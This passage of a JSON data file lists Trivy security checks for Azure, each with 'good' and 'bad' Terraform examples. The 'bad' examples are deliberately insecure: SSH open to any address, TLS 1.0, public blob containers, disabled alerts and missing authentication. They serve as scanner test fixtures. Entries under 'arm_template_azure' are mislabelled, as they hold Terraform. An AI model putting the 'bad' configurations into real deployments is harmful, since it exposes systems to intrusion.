        "rule_id": "AZURE-NETWORK-SSH_BLOCKED_FROM_INTERNET",
        "title": "Ssh Blocked From Internet",
        "provider": "azure",
        "service": "network",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges\n  good:\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_range     = \"22\"\n        source_address_prefix      = \"82.102.23.23\" # specific address\n        destination_address_prefix = \"*\"\n      }\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"ICMP\" # icmp\n        source_port_range          = \"*\"\n        destination_port_range     = \"22\"\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n    - |-\n      resource \"azurerm_network_security_rule\" \"good_example\" {\n        name                       = \"good_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_range     = \"8080\" # not ssh\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_network_security_rule\" \"bad_example\" {\n        name                       = \"bad_example_security_rule\"\n        direction                  = \"Inbound\"\n        access                     = \"Allow\"\n        protocol                   = \"TCP\"\n        source_port_range          = \"*\"\n        destination_port_range     = \"22\"\n        source_address_prefix      = \"*\"\n        destination_address_prefix = \"*\"\n      }\n",
        "file_name": "ssh_blocked_from_internet.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/network/ssh_blocked_from_internet.yaml",
        "local_path": "azure/network/ssh_blocked_from_internet.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/data-sources/network_security_group#security_rule",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/network_security_rule#source_port_ranges"
            ],
            "good": [
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_range     = \"22\"\n  source_address_prefix      = \"82.102.23.23\" # specific address\n  destination_address_prefix = \"*\"\n}",
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"ICMP\" # icmp\n  source_port_range          = \"*\"\n  destination_port_range     = \"22\"\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}",
              "resource \"azurerm_network_security_rule\" \"good_example\" {\n  name                       = \"good_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_range     = \"8080\" # not ssh\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}"
            ],
            "bad": [
              "resource \"azurerm_network_security_rule\" \"bad_example\" {\n  name                       = \"bad_example_security_rule\"\n  direction                  = \"Inbound\"\n  access                     = \"Allow\"\n  protocol                   = \"TCP\"\n  source_port_range          = \"*\"\n  destination_port_range     = \"22\"\n  source_address_prefix      = \"*\"\n  destination_address_prefix = \"*\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SECURITYCENTER-ALERT_ON_SEVERE_NOTIFICATIONS",
        "title": "Alert On Severe Notifications",
        "provider": "azure",
        "service": "securitycenter",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#alert_notifications\n  good:\n    - |-\n      resource \"azurerm_security_center_contact\" \"good_example\" {\n        email = \"good_example@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = true\n        alerts_to_admins    = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_security_center_contact\" \"bad_example\" {\n        email = \"bad_example@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = false\n        alerts_to_admins    = false\n      }\n",
        "file_name": "alert_on_severe_notifications.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/securitycenter/alert_on_severe_notifications.yaml",
        "local_path": "azure/securitycenter/alert_on_severe_notifications.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#alert_notifications"
            ],
            "good": [
              "resource \"azurerm_security_center_contact\" \"good_example\" {\n  email = \"good_example@example.com\"\n  phone = \"+1-555-555-5555\"\n\n  alert_notifications = true\n  alerts_to_admins    = true\n}"
            ],
            "bad": [
              "resource \"azurerm_security_center_contact\" \"bad_example\" {\n  email = \"bad_example@example.com\"\n  phone = \"+1-555-555-5555\"\n\n  alert_notifications = false\n  alerts_to_admins    = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SECURITYCENTER-ENABLE_STANDARD_SUBSCRIPTION",
        "title": "Enable Standard Subscription",
        "provider": "azure",
        "service": "securitycenter",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_subscription_pricing#tier\n  good:\n    - |-\n      resource \"azurerm_security_center_subscription_pricing\" \"good_example\" {\n        tier          = \"Standard\"\n        resource_type = \"VirtualMachines\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_security_center_subscription_pricing\" \"bad_example\" {\n        tier          = \"Free\"\n        resource_type = \"VirtualMachines\"\n      }\n",
        "file_name": "enable_standard_subscription.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/securitycenter/enable_standard_subscription.yaml",
        "local_path": "azure/securitycenter/enable_standard_subscription.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_subscription_pricing#tier"
            ],
            "good": [
              "resource \"azurerm_security_center_subscription_pricing\" \"good_example\" {\n  tier          = \"Standard\"\n  resource_type = \"VirtualMachines\"\n}"
            ],
            "bad": [
              "resource \"azurerm_security_center_subscription_pricing\" \"bad_example\" {\n  tier          = \"Free\"\n  resource_type = \"VirtualMachines\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SECURITYCENTER-SET_REQUIRED_CONTACT_DETAILS",
        "title": "Set Required Contact Details",
        "provider": "azure",
        "service": "securitycenter",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#phone\n  good:\n    - |-\n      resource \"azurerm_security_center_contact\" \"good_example\" {\n        email = \"good_contact@example.com\"\n        phone = \"+1-555-555-5555\"\n\n        alert_notifications = true\n        alerts_to_admins    = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_security_center_contact\" \"bad_example\" {\n        email = \"bad_contact@example.com\"\n        phone = \"\"\n\n        alert_notifications = true\n        alerts_to_admins    = true\n      }\n",
        "file_name": "set_required_contact_details.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/securitycenter/set_required_contact_details.yaml",
        "local_path": "azure/securitycenter/set_required_contact_details.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/security_center_contact#phone"
            ],
            "good": [
              "resource \"azurerm_security_center_contact\" \"good_example\" {\n  email = \"good_contact@example.com\"\n  phone = \"+1-555-555-5555\"\n\n  alert_notifications = true\n  alerts_to_admins    = true\n}"
            ],
            "bad": [
              "resource \"azurerm_security_center_contact\" \"bad_example\" {\n  email = \"bad_contact@example.com\"\n  phone = \"\"\n\n  alert_notifications = true\n  alerts_to_admins    = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-ALLOW_MICROSOFT_SERVICE_BYPASS",
        "title": "Allow Microsoft Service Bypass",
        "provider": "azure",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#bypass\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#bypass\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n\n        location                 = azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"LRS\"\n\n        network_rules {\n          default_action = \"Deny\"\n          ip_rules       = [\"100.0.0.1\"]\n          bypass         = [\"Metrics\", \"AzureServices\"]\n        }\n      }\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n      }\n\n      resource \"azurerm_storage_account_network_rules\" \"test\" {\n        resource_group_name  = azurerm_resource_group.test.name\n        storage_account_name = azurerm_storage_account.good_example.name\n\n        default_action = \"Allow\"\n        ip_rules       = [\"127.0.0.1\"]\n        bypass         = [\"Metrics\", \"AzureServices\"]\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n\n        location                 = azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"LRS\"\n\n        network_rules {\n          default_action = \"Deny\"\n          ip_rules       = [\"100.0.0.1\"]\n          bypass         = [\"Metrics\"]\n        }\n      }\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n      }\n\n      resource \"azurerm_storage_account_network_rules\" \"test\" {\n        resource_group_name  = azurerm_resource_group.test.name\n        storage_account_name = azurerm_storage_account.bad_example.name\n\n        default_action = \"Allow\"\n        ip_rules       = [\"127.0.0.1\"]\n        bypass         = [\"Metrics\"]\n      }\n",
        "file_name": "allow_microsoft_service_bypass.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/allow_microsoft_service_bypass.yaml",
        "local_path": "azure/storage/allow_microsoft_service_bypass.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#bypass",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#bypass"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n\n  location                 = azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n\n  network_rules {\n    default_action = \"Deny\"\n    ip_rules       = [\"100.0.0.1\"]\n    bypass         = [\"Metrics\", \"AzureServices\"]\n  }\n}",
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n}\n\nresource \"azurerm_storage_account_network_rules\" \"test\" {\n  resource_group_name  = azurerm_resource_group.test.name\n  storage_account_name = azurerm_storage_account.good_example.name\n\n  default_action = \"Allow\"\n  ip_rules       = [\"127.0.0.1\"]\n  bypass         = [\"Metrics\", \"AzureServices\"]\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n\n  location                 = azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"LRS\"\n\n  network_rules {\n    default_action = \"Deny\"\n    ip_rules       = [\"100.0.0.1\"]\n    bypass         = [\"Metrics\"]\n  }\n}",
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n}\n\nresource \"azurerm_storage_account_network_rules\" \"test\" {\n  resource_group_name  = azurerm_resource_group.test.name\n  storage_account_name = azurerm_storage_account.bad_example.name\n\n  default_action = \"Allow\"\n  ip_rules       = [\"127.0.0.1\"]\n  bypass         = [\"Metrics\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-DEFAULT_ACTION_DENY",
        "title": "Default Action Deny",
        "provider": "azure",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#default_action\n  good:\n    - |-\n      resource \"azurerm_storage_account_network_rules\" \"good_example\" {\n\n        default_action             = \"Deny\"\n        ip_rules                   = [\"127.0.0.1\"]\n        virtual_network_subnet_ids = [azurerm_subnet.test.id]\n        bypass                     = [\"Metrics\"]\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account_network_rules\" \"bad_example\" {\n\n        default_action             = \"Allow\"\n        ip_rules                   = [\"127.0.0.1\"]\n        virtual_network_subnet_ids = [azurerm_subnet.test.id]\n        bypass                     = [\"Metrics\"]\n      }\n",
        "file_name": "default_action_deny.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/default_action_deny.yaml",
        "local_path": "azure/storage/default_action_deny.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account_network_rules#default_action"
            ],
            "good": [
              "resource \"azurerm_storage_account_network_rules\" \"good_example\" {\n\n  default_action             = \"Deny\"\n  ip_rules                   = [\"127.0.0.1\"]\n  virtual_network_subnet_ids = [azurerm_subnet.test.id]\n  bypass                     = [\"Metrics\"]\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account_network_rules\" \"bad_example\" {\n\n  default_action             = \"Allow\"\n  ip_rules                   = [\"127.0.0.1\"]\n  virtual_network_subnet_ids = [azurerm_subnet.test.id]\n  bypass                     = [\"Metrics\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-ENFORCE_HTTPS",
        "title": "Enforce Https",
        "provider": "azure",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                      = \"storageaccountname\"\n        resource_group_name       = azurerm_resource_group.example.name\n        location                  = azurerm_resource_group.example.location\n        account_tier              = \"Standard\"\n        account_replication_type  = \"GRS\"\n        enable_https_traffic_only = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                      = \"storageaccountname\"\n        resource_group_name       = azurerm_resource_group.example.name\n        location                  = azurerm_resource_group.example.location\n        account_tier              = \"Standard\"\n        account_replication_type  = \"GRS\"\n        enable_https_traffic_only = false\n      }\n",
        "file_name": "enforce_https.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/enforce_https.yaml",
        "local_path": "azure/storage/enforce_https.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#enable_https_traffic_only"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = true\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                      = \"storageaccountname\"\n  resource_group_name       = azurerm_resource_group.example.name\n  location                  = azurerm_resource_group.example.location\n  account_tier              = \"Standard\"\n  account_replication_type  = \"GRS\"\n  enable_https_traffic_only = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "azure",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://www.terraform.io/docs/providers/azure/r/storage_container.html#properties\n  good:\n    - |-\n      resource \"azurerm_storage_container\" \"good_example\" {\n        name                  = \"terraform-container-storage\"\n        container_access_type = \"private\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_container\" \"bad_example\" {\n        name                  = \"terraform-container-storage\"\n        container_access_type = \"blob\"\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/no_public_access.yaml",
        "local_path": "azure/storage/no_public_access.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://www.terraform.io/docs/providers/azure/r/storage_container.html#properties"
            ],
            "good": [
              "resource \"azurerm_storage_container\" \"good_example\" {\n  name                  = \"terraform-container-storage\"\n  container_access_type = \"private\"\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_container\" \"bad_example\" {\n  name                  = \"terraform-container-storage\"\n  container_access_type = \"blob\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-QUEUE_SERVICES_LOGGING_ENABLED",
        "title": "Queue Services Logging Enabled",
        "provider": "azure",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                     = \"example\"\n        resource_group_name      = data.azurerm_resource_group.example.name\n        location                 = data.azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"GRS\"\n        queue_properties {\n          logging {\n            delete                = true\n            read                  = true\n            write                 = true\n            version               = \"1.0\"\n            retention_policy_days = 10\n          }\n        }\n      }\n\n      resource \"azurerm_storage_queue\" \"good_example\" {\n        name                 = \"my-queue\"\n        storage_account_name = azurerm_storage_account.good_example.name\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                     = \"example\"\n        resource_group_name      = data.azurerm_resource_group.example.name\n        location                 = data.azurerm_resource_group.example.location\n        account_tier             = \"Standard\"\n        account_replication_type = \"GRS\"\n        queue_properties {\n        }\n      }\n\n      resource \"azurerm_storage_queue\" \"bad_example\" {\n        name                 = \"my-queue\"\n        storage_account_name = azurerm_storage_account.bad_example.name\n      }\n",
        "file_name": "queue_services_logging_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/queue_services_logging_enabled.yaml",
        "local_path": "azure/storage/queue_services_logging_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                     = \"example\"\n  resource_group_name      = data.azurerm_resource_group.example.name\n  location                 = data.azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n  queue_properties {\n    logging {\n      delete                = true\n      read                  = true\n      write                 = true\n      version               = \"1.0\"\n      retention_policy_days = 10\n    }\n  }\n}\n\nresource \"azurerm_storage_queue\" \"good_example\" {\n  name                 = \"my-queue\"\n  storage_account_name = azurerm_storage_account.good_example.name\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                     = \"example\"\n  resource_group_name      = data.azurerm_resource_group.example.name\n  location                 = data.azurerm_resource_group.example.location\n  account_tier             = \"Standard\"\n  account_replication_type = \"GRS\"\n  queue_properties {\n  }\n}\n\nresource \"azurerm_storage_queue\" \"bad_example\" {\n  name                 = \"my-queue\"\n  storage_account_name = azurerm_storage_account.bad_example.name\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-STORAGE-USE_SECURE_TLS_POLICY",
        "title": "Use Secure Tls Policy",
        "provider": "azure",
        "service": "storage",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#min_tls_version\n  good:\n    - |-\n      resource \"azurerm_storage_account\" \"good_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        min_tls_version     = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_storage_account\" \"bad_example\" {\n        name                = \"storageaccountname\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        min_tls_version     = \"TLS1_0\"\n      }\n",
        "file_name": "use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/storage/use_secure_tls_policy.yaml",
        "local_path": "azure/storage/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#min_tls_version"
            ],
            "good": [
              "resource \"azurerm_storage_account\" \"good_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  min_tls_version     = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_storage_account\" \"bad_example\" {\n  name                = \"storageaccountname\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  min_tls_version     = \"TLS1_0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-SYNAPSE-VIRTUAL_NETWORK_ENABLED",
        "title": "Virtual Network Enabled",
        "provider": "azure",
        "service": "synapse",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/synapse_workspace#managed_virtual_network_enabled\n  good:\n    - |-\n      resource \"azurerm_synapse_workspace\" \"good_example\" {\n        name                                 = \"example\"\n        resource_group_name                  = azurerm_resource_group.example.name\n        location                             = azurerm_resource_group.example.location\n        storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n        managed_virtual_network_enabled      = true\n      }\n  bad:\n    - |-\n      resource \"azurerm_synapse_workspace\" \"bad_example\" {\n        name                                 = \"example\"\n        resource_group_name                  = azurerm_resource_group.example.name\n        location                             = azurerm_resource_group.example.location\n        storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n        managed_virtual_network_enabled      = false\n      }\n",
        "file_name": "virtual_network_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/synapse/virtual_network_enabled.yaml",
        "local_path": "azure/synapse/virtual_network_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/synapse_workspace#managed_virtual_network_enabled"
            ],
            "good": [
              "resource \"azurerm_synapse_workspace\" \"good_example\" {\n  name                                 = \"example\"\n  resource_group_name                  = azurerm_resource_group.example.name\n  location                             = azurerm_resource_group.example.location\n  storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n  managed_virtual_network_enabled      = true\n}"
            ],
            "bad": [
              "resource \"azurerm_synapse_workspace\" \"bad_example\" {\n  name                                 = \"example\"\n  resource_group_name                  = azurerm_resource_group.example.name\n  location                             = azurerm_resource_group.example.location\n  storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n  managed_virtual_network_enabled      = false\n}"
            ]
          }
        }
      }
    ],
    "arm_template_azure": [
      {
        "rule_id": "AZURE-APPSERVICE-ACCOUNT_IDENTITY_REGISTERED",
        "title": "Account Identity Registered",
        "provider": "azure",
        "service": "appservice",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#identity\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        identity {\n          type         = \"UserAssigned\"\n          identity_ids = \"webapp1\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n",
        "file_name": "account_identity_registered.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/account_identity_registered.yaml",
        "local_path": "azure/appservice/account_identity_registered.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#identity"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  identity {\n    type         = \"UserAssigned\"\n    identity_ids = \"webapp1\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-AUTHENTICATION_ENABLED",
        "title": "Authentication Enabled",
        "provider": "azure",
        "service": "appservice",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#enabled\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        auth_settings {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n",
        "file_name": "authentication_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/authentication_enabled.yaml",
        "local_path": "azure/appservice/authentication_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#enabled"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  auth_settings {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-APPSERVICE-ENABLE_HTTP2",
        "title": "Enable Http2",
        "provider": "azure",
        "service": "appservice",
        "language": "arm_template",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#http2_enabled\n  good:\n    - |-\n      resource \"azurerm_app_service\" \"good_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n\n        site_config {\n          http2_enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n      }\n    - |-\n      resource \"azurerm_app_service\" \"bad_example\" {\n        name                = \"example-app-service\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        app_service_plan_id = azurerm_app_service_plan.example.id\n        site_config {\n          http2_enabled = false\n        }\n      }\n",
        "file_name": "enable_http2.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/enable_http2.yaml",
        "local_path": "azure/appservice/enable_http2.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#http2_enabled"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n    http2_enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}",
